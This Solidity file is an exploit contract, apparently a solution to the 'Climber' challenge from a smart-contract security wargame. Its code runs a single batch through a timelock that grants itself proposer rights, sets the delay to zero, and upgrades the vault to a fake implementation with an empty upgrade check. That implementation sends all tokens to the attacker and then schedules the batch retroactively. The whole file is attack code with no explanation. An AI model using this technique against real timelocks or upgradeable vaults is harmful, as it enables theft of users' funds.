// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberVault.sol";
import "./ClimberTimelock.sol";
import "hardhat/console.sol";

contract AttackClimber {

    constructor(address player, ClimberTimelock timelock, ClimberVault vault, IERC20 token) {
        //deploy new impl
        FakeImplementation impl = new FakeImplementation(player, timelock);
        bytes memory implCall = abi.encodeWithSelector(impl.sweep.selector, token, impl);

        //create arrays
        address[] memory targets = new address[](3);
        uint256[] memory values = new uint256[](3);
        bytes[] memory dataElements = new bytes[](3);

        //grant proposer role to impl
        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSelector(timelock.grantRole.selector, PROPOSER_ROLE, address(impl));

        //update delay to 0
        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSelector(timelock.updateDelay.selector, 0);

        //set new implementation
        targets[2] = address(vault);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSelector(vault.upgradeToAndCall.selector, address(impl), implCall);

        impl.setSchedule(targets, values, dataElements);
        timelock.execute(targets, values, dataElements, "");
    }

}

contract FakeImplementation is UUPSUpgradeable {
  address public player;
  address[] targets;
  uint256[] values;
  bytes[] dataElements;
  ClimberTimelock timelock;

  constructor(address _player, ClimberTimelock _timelock) {
    player = _player;
    timelock = _timelock;
  }

  function setSchedule(address[] memory _targets, uint256[] memory _values, bytes[] memory _dataElements) public {
    for (uint256 i; i < _targets.length;) {
        targets.push(_targets[i]);
        values.push(_values[i]); 
        dataElements.push(_dataElements[i]);
        i++;
    }
  }

  function sweep(IERC20 token, FakeImplementation impl) public {
    token.transfer(impl.player(), token.balanceOf(address(this)));
    
    impl.schedule();
  }

  function schedule() public {
    timelock.schedule(targets, values, dataElements, '');
  }

  function _authorizeUpgrade(address newImplementation) internal virtual override {}
}